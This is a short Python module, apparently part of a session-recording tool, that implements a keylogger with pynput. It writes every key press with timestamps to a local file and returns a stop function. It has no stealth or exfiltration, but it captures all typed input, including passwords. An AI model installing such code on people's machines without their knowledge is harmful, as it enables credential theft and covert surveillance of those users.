# Jai Shree Ram

from pynput import keyboard
import os
from datetime import datetime

def start_keylogger(session_folder):
    keylog_dir = os.path.join(session_folder, 'keylog')
    os.makedirs(keylog_dir, exist_ok=True)
    
    stop_flag = False
    
    # Create single keylog file for the session
    timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
    keylog_file = os.path.join(keylog_dir, f'keylog_{timestamp}.txt')
    with open(keylog_file, 'w', encoding='utf-8') as f:
        f.write(f"Keylog started at {datetime.now()}\n")
    
    def on_press(key):
        if not stop_flag:
            try:
                with open(keylog_file, 'a', encoding='utf-8') as f:
                    if hasattr(key, 'char'):
                        f.write(f'[{datetime.now()}] Key pressed: {key.char}\n')
                    else:
                        f.write(f'[{datetime.now()}] Special key pressed: {key}\n')
                    f.flush()  # Immediately write to file
            except Exception as e:
                print(f"Error logging keystroke: {str(e)}")

    def on_release(key):
        if stop_flag:
            return False

    # Create and start keyboard listener
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()

    def stop_recording():
        nonlocal stop_flag
        stop_flag = True
        listener.stop()
        print("Keylogger stopped")

    return stop_recording
